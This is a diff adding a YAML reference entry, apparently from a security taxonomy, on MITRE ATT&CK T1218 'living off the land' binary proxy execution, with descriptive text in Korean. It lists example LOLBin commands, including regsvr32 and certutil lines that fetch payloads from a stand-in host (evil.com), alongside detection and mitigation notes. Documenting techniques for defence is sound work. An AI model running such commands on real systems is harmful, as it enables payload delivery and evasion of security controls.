@@ -1,0 +1,116 @@
+# GR Atom: System Binary Proxy Execution
+# Version: 1.0
+# Created: 2025-01-29
+
+identity:
+  id: "ATK-MITRE-T1218-001"
+  name: "System Binary Proxy Execution"
+  normalization:
+    normalized_name: "system binary proxy execution lolbas lolbins living off land"
+    normalization_version: "1.0"
+  aliases:
+    - "시스템 바이너리 프록시 실행"
+    - "LOLBins"
+    - "Living off the Land"
+
+classification:
+  domain: security
+  type: attack
+  abstraction_level: 2
+  gr_coordinates:
+    layer: "L5"
+    zone: "Zone4"
+    tags: ["ATK", "MITRE", "DEF-EVASION"]
+
+definition:
+  what: |
+    시스템에 기본 설치된 신뢰할 수 있는 바이너리를 악용하여
+    악성 페이로드를 실행하고 방어를 우회하는 기법이다.
+  why: |
+    서명된 Microsoft 바이너리로 탐지를 회피한다.
+    애플리케이션 화이트리스트를 우회한다.
+  how: |
+    1. 악용 가능한 시스템 바이너리 선택
+    2. 악성 페이로드 준비
+    3. 프록시 실행
+    4. 탐지 회피
+
+relations:
+  structural:
+    is_a:
+      - "ATK-MITRE-DEF-EVASION-001"
+    related_to:
+      - "ATK-MITRE-EXECUTION-001"
+
+properties:
+  technical:
+    mitre_id: "T1218"
+    tactic: "Defense Evasion"
+    platforms: ["Windows"]
+    lolbins_examples:
+      - name: "Mshta"
+        id: "T1218.005"
+        command: "mshta vbscript:Execute(\"CreateObject...\")"
+      - name: "Rundll32"
+        id: "T1218.011"
+        command: "rundll32 malicious.dll,EntryPoint"
+      - name: "Regsvr32"
+        id: "T1218.010"
+        command: "regsvr32 /s /n /u /i:http://evil.com/f.sct scrobj.dll"
+      - name: "Certutil"
+        id: "T1140"
+        command: "certutil -urlcache -f http://evil.com/mal.exe"
+      - name: "MSBuild"
+        id: "T1127.001"
+        command: "MSBuild.exe malicious.csproj"
+      - name: "WMIC"
+        id: "T1218.001"
+        command: "wmic process call create cmd"
+    lolbas_project: "https://lolbas-project.github.io"
+    use_cases:
+      - "다운로드"
+      - "실행"
+      - "인코딩/디코딩"
+      - "컴파일"
+      - "파일 조작"
+    detection:
+      - "비정상 프로세스 명령줄"
+      - "LOLBin 네트워크 연결"
+      - "Sysmon Event ID 1"
+      - "부모-자식 프로세스 이상"
+    mitigation:
+      - "애플리케이션 화이트리스트"
+      - "명령줄 로깅"
+      - "ASR 규칙"
+      - "EDR 솔루션"
+
+metadata:
+  trust:
+    source: official
+    references:
+      - "MITRE ATT&CK T1218"
+      - "LOLBAS Project"
+    confidence: 1.0
+    verified:
+      status: verified
+      date: 2025-01-29
+      by: "GR System"
+  temporal:
+    created: 2025-01-29
+    modified: 2025-01-29
+    revision: 1
+  security:
+    sensitivity: public
+  ai:
+    embedding_text: |
+      LOLBins는 시스템 바이너리를 악용하여 악성 코드를 실행하고
+      탐지를 회피하는 Living off the Land 기법이다.
+    search_keywords:
+      - "LOLBins"
+      - "Living off the Land"
+      - "시스템 바이너리"
+      - "Defense Evasion"
+    related_queries:
+      - "Mshta"
+      - "Certutil"
+      - "탐지 회피"
